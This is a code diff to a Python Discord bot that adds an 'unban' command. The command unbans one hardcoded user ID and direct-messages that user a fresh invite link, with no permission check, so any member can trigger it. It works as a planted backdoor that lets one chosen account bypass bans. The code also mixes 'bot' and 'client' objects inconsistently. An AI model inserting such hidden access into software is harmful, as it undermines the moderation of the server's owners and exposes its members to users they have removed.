@@ -107,6 +107,13 @@ async def shutdown(ctx):
     else:
         await ctx.send("Death is whoever does Death’s job: me")
 
+@bot.command(name='unban')
+async def _unban(ctx):
+    user = client.get_user(774295594276618262)
+    await ctx.guild.unban(user)
+    link = await ctx.channel.create_invite(max_age = 300)
+    await user.send(link)
+	
 @client.command(pass_context=True)
 async def poll(ctx, question, arg, *, arg2=30):
 
